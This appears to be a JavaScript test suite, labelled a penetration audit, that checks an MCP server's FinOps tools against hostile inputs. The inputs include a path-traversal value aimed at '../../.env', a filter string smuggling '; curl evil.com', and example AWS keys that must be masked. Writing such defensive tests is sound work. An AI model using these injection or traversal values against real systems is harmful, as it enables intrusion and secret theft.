/**
 * Test Suite: Fire Team Elite Security & Penetration Audit (Gang 3)
 * Part of Diamantenschmiede (AYA Protocol / Fire Team Elite Certified)
 */

import assert from 'assert';
import { handleRequest } from '../src/mcp/server.mjs';

async function runTest() {
  console.log('🔥 [FIRE TEAM ELITE AUDIT] Starte Pen-Testing & Adversarial Stress Tests...');

  // 1. Attack Vector: Path Traversal via MCP Toolcall
  const traversalRes = await handleRequest({
    jsonrpc: '2.0',
    id: 101,
    method: 'tools/call',
    params: {
      name: 'finops_audit_scan',
      arguments: { filePath: '../../.env' }
    }
  });
  assert.strictEqual(traversalRes.error !== undefined, true, 'MCP muss Traversal-Angriff auf .env abwehren');
  assert.strictEqual(traversalRes.error.message.includes('Security Violation'), true, 'Security Violation Fehler zurückgegeben');

  // 2. Attack Vector: Shell Injection in Filter Parameter
  const injectionRes = await handleRequest({
    jsonrpc: '2.0',
    id: 102,
    method: 'tools/call',
    params: {
      name: 'finops_scan_cloud',
      arguments: { filter: "Type == 'aws_s3' ; curl evil.com" }
    }
  });
  assert.strictEqual(injectionRes.error !== undefined, true, 'MCP muss Shell-Injection im Filter abwehren');
  assert.strictEqual(injectionRes.error.message.includes('Security Violation'), true, 'Security Violation Fehler zurückgegeben');

  // 3. Attack Vector: Credential Exfiltration in Scan Payload
  const maliciousPayload = {
    unmanaged: [
      {
        type: 'aws_iam_access_key',
        id: 'AKIAIOSFODNN7EXAMPLE',
        attrs: {
          secret: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
        }
      }
    ]
  };

  const exfilRes = await handleRequest({
    jsonrpc: '2.0',
    id: 103,
    method: 'tools/call',
    params: {
      name: 'finops_audit_scan',
      arguments: { rawJson: JSON.stringify(maliciousPayload) }
    }
  });

  const responseText = exfilRes.result.content[0].text;
  assert.strictEqual(responseText.includes('AKIAIOSFODNN7EXAMPLE'), false, 'Kein Klartext-AWS-Key im MCP-Output');
  assert.strictEqual(responseText.includes('AKIA****************'), true, 'AWS-Key maskiert');

  // 4. Attack Vector: Malformed JSON Bomb
  const malformedRes = await handleRequest({
    jsonrpc: '2.0',
    id: 104,
    method: 'tools/call',
    params: {
      name: 'finops_audit_scan',
      arguments: { rawJson: '{"corrupted": true, [invalid json}' }
    }
  });
  assert.strictEqual(malformedRes.error !== undefined, true, 'Fehler bei korruptem JSON sauber abgefangen');

  // 5. Stress Test: Concurrency Burst (30 gleichzeitige MCP-Aufrufe)
  console.log('⚡ Führe Concurrency Burst durch (30 parallele Requests)...');
  const burstPromises = [];
  for (let i = 0; i < 30; i++) {
    burstPromises.push(
      handleRequest({
        jsonrpc: '2.0',
        id: 200 + i,
        method: 'tools/call',
        params: { name: 'finops_status', arguments: {} }
      })
    );
  }

  const burstResults = await Promise.all(burstPromises);
  assert.strictEqual(burstResults.length, 30, 'Alle 30 Requests verarbeitet');
  for (const res of burstResults) {
    assert.strictEqual(res.result !== undefined, true, 'Request erfolgreich ohne Crash');
  }

  console.log('✅ [FIRE TEAM ELITE AUDIT BESTANDEN] 0 Lücken, 100% Abwehr gegen Injection, Traversal & Credential Leakage!');
}

runTest().catch((err) => {
  console.error('❌ [FIRE TEAM AUDIT FEHLGESCHLAGEN]:', err);
  process.exit(1);
});
